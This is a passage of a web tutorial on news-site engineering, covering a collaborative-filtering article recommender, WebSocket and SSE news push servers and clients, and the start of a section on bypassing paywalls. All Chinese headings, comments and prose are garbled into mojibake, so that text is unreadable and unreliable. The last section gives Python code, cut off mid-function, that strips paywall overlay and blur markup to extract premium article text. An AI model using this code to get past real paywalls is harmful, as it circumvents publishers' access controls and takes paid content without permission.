    <span class="k">def</span><span class="w"> </span><span class="nf">recommend</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">top_n</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¸ºç”¨æˆ·æ¨è top_n ç¯‡æ–‡ç« &quot;&quot;&quot;</span>
        <span class="c1"># è·å–ç”¨æˆ·å·²é˜…è¯»çš„æ–‡ç« </span>
        <span class="n">user_ratings</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">user_item_matrix</span><span class="p">[</span><span class="n">user_id</span><span class="p">]</span>

        <span class="c1"># è®¡ç®—æ¨èåˆ†æ•°</span>
        <span class="n">scores</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">item_similarity</span><span class="o">.</span><span class="n">T</span><span class="o">.</span><span class="n">dot</span><span class="p">(</span><span class="n">user_ratings</span><span class="p">)</span>

        <span class="c1"># æ’é™¤å·²é˜…è¯»çš„æ–‡ç« </span>
        <span class="n">scores</span><span class="p">[</span><span class="n">user_ratings</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>

        <span class="c1"># è¿”å› top_n</span>
        <span class="n">top_items</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">argsort</span><span class="p">(</span><span class="n">scores</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][:</span><span class="n">top_n</span><span class="p">]</span>

        <span class="k">return</span> <span class="n">top_items</span>

<span class="c1"># ç¤ºä¾‹</span>
<span class="c1"># ç”¨æˆ·-æ–‡ç« çŸ©é˜µï¼ˆ1 è¡¨ç¤ºé˜…è¯»ï¼Œ0 è¡¨ç¤ºæœªé˜…è¯»ï¼‰</span>
<span class="n">user_item_matrix</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">array</span><span class="p">([</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>  <span class="c1"># ç”¨æˆ· 0</span>
    <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>  <span class="c1"># ç”¨æˆ· 1</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>  <span class="c1"># ç”¨æˆ· 2</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>  <span class="c1"># ç”¨æˆ· 3</span>
<span class="p">])</span>

<span class="n">recommender</span> <span class="o">=</span> <span class="n">CollaborativeFilteringRecommender</span><span class="p">()</span>
<span class="n">recommender</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span><span class="n">user_item_matrix</span><span class="p">)</span>

<span class="c1"># ä¸ºç”¨æˆ· 0 æ¨è</span>
<span class="n">recommendations</span> <span class="o">=</span> <span class="n">recommender</span><span class="o">.</span><span class="n">recommend</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">top_n</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Recommended articles for user 0: </span><span class="si">{</span><span class="n">recommendations</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-3-å®æ—¶æ–°é—»æ¨é€websocketsse">æ¡ˆä¾‹ 3: å®æ—¶æ–°é—»æ¨é€ï¼ˆWebSocket/SSEï¼‰</h2>

      <h3 id="èƒŒæ™¯-3">èƒŒæ™¯</h3>

      <p>ç°ä»£æ–°é—»ç½‘ç«™ä½¿ç”¨ WebSocket æˆ– Server-Sent Events (SSE) æ¨é€å®æ—¶æ–°é—»ã€‚</p>

      <h3 id="websocket-å®æ—¶æ¨é€">WebSocket å®æ—¶æ¨é€</h3>

      <h4 id="æœåŠ¡ç«¯nodejs">æœåŠ¡ç«¯ï¼ˆNode.jsï¼‰</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">WebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;ws&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">wss</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WebSocket</span><span class="p">.</span><span class="nx">Server</span><span class="p">({</span><span class="w"> </span><span class="nx">port</span><span class="o">:</span><span class="w"> </span><span class="mf">8080</span><span class="w"> </span><span class="p">});</span>

<span class="c1">// æ¨¡æ‹Ÿæ–°é—»æº</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">getLatestNews</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">(),</span>
<span class="w">        </span><span class="nx">title</span><span class="o">:</span><span class="w"> </span><span class="sb">`Breaking News at </span><span class="si">${</span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">().</span><span class="nx">toLocaleTimeString</span><span class="p">()</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
<span class="w">        </span><span class="nx">content</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Lorem ipsum dolor sit amet...&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>

<span class="c1">// å¹¿æ’­ç»™æ‰€æœ‰å®¢æˆ·ç«¯</span>
<span class="nx">wss</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;connection&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">ws</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;New client connected&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ¯ 5 ç§’æ¨é€ä¸€æ¡æ–°é—»</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">interval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setInterval</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">news</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getLatestNews</span><span class="p">();</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">news</span><span class="p">));</span>
<span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="mf">5000</span><span class="p">);</span>

<span class="w">    </span><span class="nx">ws</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;close&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">clearInterval</span><span class="p">(</span><span class="nx">interval</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Client disconnected&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h4 id="å®¢æˆ·ç«¯python">å®¢æˆ·ç«¯ï¼ˆPythonï¼‰</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">websocket</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RealtimeNewsClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws_url</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws_url</span> <span class="o">=</span> <span class="n">ws_url</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">news_callback</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ”¶åˆ°æ¶ˆæ¯æ—¶çš„å›è°ƒ&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">news</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="n">news</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">news</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">news_callback</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">news_callback</span><span class="p">(</span><span class="n">news</span><span class="p">)</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error parsing message: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_error</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">error</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;é”™è¯¯å›è°ƒ&quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;WebSocket error: </span><span class="si">{</span><span class="n">error</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_close</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">close_status_code</span><span class="p">,</span> <span class="n">close_msg</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿æ¥å…³é—­å›è°ƒ&quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;WebSocket connection closed&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_open</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ws</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿æ¥å»ºç«‹å›è°ƒ&quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;WebSocket connection opened&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">callback</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿æ¥åˆ° WebSocket æœåŠ¡å™¨&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">news_callback</span> <span class="o">=</span> <span class="n">callback</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="o">.</span><span class="n">WebSocketApp</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">ws_url</span><span class="p">,</span>
            <span class="n">on_open</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_open</span><span class="p">,</span>
            <span class="n">on_message</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_message</span><span class="p">,</span>
            <span class="n">on_error</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_error</span><span class="p">,</span>
            <span class="n">on_close</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">on_close</span>
        <span class="p">)</span>

        <span class="c1"># åœ¨å•ç‹¬çš„çº¿ç¨‹ä¸­è¿è¡Œ</span>
        <span class="n">wst</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">run_forever</span><span class="p">)</span>
        <span class="n">wst</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
        <span class="n">wst</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">send</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘é€æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">message</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">close</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å…³é—­è¿æ¥&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="k">def</span><span class="w"> </span><span class="nf">handle_news</span><span class="p">(</span><span class="n">news</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;å¤„ç†æ¥æ”¶åˆ°çš„æ–°é—»&quot;&quot;&quot;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Received: </span><span class="si">{</span><span class="n">news</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="c1"># ä¿å­˜åˆ°æ•°æ®åº“ã€å‘é€é€šçŸ¥ç­‰</span>

<span class="n">client</span> <span class="o">=</span> <span class="n">RealtimeNewsClient</span><span class="p">(</span><span class="s1">&#39;ws://localhost:8080&#39;</span><span class="p">)</span>
<span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">callback</span><span class="o">=</span><span class="n">handle_news</span><span class="p">)</span>

<span class="c1"># ä¿æŒè¿è¡Œ</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="k">try</span><span class="p">:</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="server-sent-events-sse">Server-Sent Events (SSE)</h3>

      <h4 id="æœåŠ¡ç«¯python-flask">æœåŠ¡ç«¯ï¼ˆPython Flaskï¼‰</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_news_stream</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆæ–°é—»æµ&quot;&quot;&quot;</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">news</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()),</span>
            <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Breaking News at </span><span class="si">{</span><span class="n">time</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;%H:%M:%S&quot;</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
            <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="s1">&#39;Lorem ipsum dolor sit amet...&#39;</span><span class="p">,</span>
            <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="p">}</span>

        <span class="c1"># SSE æ ¼å¼</span>
        <span class="k">yield</span> <span class="sa">f</span><span class="s2">&quot;data: </span><span class="si">{</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">news</span><span class="p">)</span><span class="si">}</span><span class="se">\n\n</span><span class="s2">&quot;</span>

        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/news/stream&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">news_stream</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;SSE ç«¯ç‚¹&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span>
        <span class="n">generate_news_stream</span><span class="p">(),</span>
        <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;text/event-stream&#39;</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
            <span class="s1">&#39;Cache-Control&#39;</span><span class="p">:</span> <span class="s1">&#39;no-cache&#39;</span><span class="p">,</span>
            <span class="s1">&#39;X-Accel-Buffering&#39;</span><span class="p">:</span> <span class="s1">&#39;no&#39;</span>
        <span class="p">}</span>
    <span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">threaded</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="å®¢æˆ·ç«¯python-2">å®¢æˆ·ç«¯ï¼ˆPythonï¼‰</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">class</span><span class="w"> </span><span class="nc">SSENewsClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">sse_url</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">sse_url</span> <span class="o">=</span> <span class="n">sse_url</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">callback</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç›‘å¬ SSE äº‹ä»¶&quot;&quot;&quot;</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/event-stream&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Cache-Control&#39;</span><span class="p">:</span> <span class="s1">&#39;no-cache&#39;</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">sse_url</span><span class="p">,</span>
            <span class="n">stream</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
        <span class="p">)</span>

        <span class="c1"># é€è¡Œè¯»å–</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">iter_lines</span><span class="p">():</span>
            <span class="k">if</span> <span class="n">line</span><span class="p">:</span>
                <span class="n">decoded_line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

                <span class="c1"># SSE äº‹ä»¶æ ¼å¼: &quot;data: {...}&quot;</span>
                <span class="k">if</span> <span class="n">decoded_line</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">):</span>
                    <span class="n">data</span> <span class="o">=</span> <span class="n">decoded_line</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

                    <span class="k">try</span><span class="p">:</span>
                        <span class="n">news</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                        <span class="n">callback</span><span class="p">(</span><span class="n">news</span><span class="p">)</span>
                    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error parsing SSE data: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="k">def</span><span class="w"> </span><span class="nf">handle_sse_news</span><span class="p">(</span><span class="n">news</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[SSE] </span><span class="si">{</span><span class="n">news</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">client</span> <span class="o">=</span> <span class="n">SSENewsClient</span><span class="p">(</span><span class="s1">&#39;http://localhost:5000/news/stream&#39;</span><span class="p">)</span>
<span class="n">client</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="n">callback</span><span class="o">=</span><span class="n">handle_sse_news</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-4-ä»˜è´¹å¢™ç»•è¿‡ä¸å†…å®¹æå–">æ¡ˆä¾‹ 4: ä»˜è´¹å¢™ç»•è¿‡ä¸å†…å®¹æå–</h2>

      <h3 id="èƒŒæ™¯-4">èƒŒæ™¯</h3>

      <p>è®¸å¤šæ–°é—»ç½‘ç«™ä½¿ç”¨ä»˜è´¹å¢™ï¼ˆPaywallï¼‰é™åˆ¶å†…å®¹è®¿é—®ã€‚å¸¸è§ç±»å‹åŒ…æ‹¬ç¡¬ä»˜è´¹å¢™å’Œè½¯ä»˜è´¹å¢™ã€‚</p>

      <h3 id="è½¯ä»˜è´¹å¢™ç±»å‹">è½¯ä»˜è´¹å¢™ç±»å‹</h3>

      <h4 id="1-javascript-éšè—å†…å®¹">1. JavaScript éšè—å†…å®¹</h4>

      <p>å†…å®¹åœ¨ HTML ä¸­ï¼Œä½†ç”¨ CSS/JS éšè—:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;article-content&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>First paragraph visible...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;paywall-blur&quot;</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Premium content hidden here...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>More premium content...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;paywall-overlay&quot;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Subscribe to read more<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span><span class="p">&gt;</span>Subscribe Now<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">.</span><span class="nc">paywall-blur</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">filter</span><span class="p">:</span><span class="w"> </span><span class="nb">blur</span><span class="p">(</span><span class="mi">5</span><span class="kt">px</span><span class="p">);</span>
<span class="w">    </span><span class="k">user-select</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">def</span><span class="w"> </span><span class="nf">bypass_soft_paywall</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç»•è¿‡è½¯ä»˜è´¹å¢™&quot;&quot;&quot;</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>

    <span class="c1"># ç§»é™¤ä»˜è´¹å¢™é®ç½©</span>
    <span class="k">for</span> <span class="n">overlay</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s1">&#39;paywall-overlay&#39;</span><span class="p">):</span>
        <span class="n">overlay</span><span class="o">.</span><span class="n">decompose</span><span class="p">()</span>

    <span class="c1"># ç§»é™¤æ¨¡ç³Šæ•ˆæœï¼ˆé€šè¿‡æå–åŸå§‹å†…å®¹ï¼‰</span>
    <span class="n">blurred</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s1">&#39;paywall-blur&#39;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">element</span> <span class="ow">in</span> <span class="n">blurred</span><span class="p">:</span>
        <span class="n">element</span><span class="p">[</span><span class="s1">&#39;class&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># ç§»é™¤ class</span>

    <span class="c1"># æå–å®Œæ•´æ–‡æœ¬</span>
    <span class="n">article</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">class_</span><span class="o">=</span><span class="s1">&#39;article-content&#39;</span><span class="p">)</span>
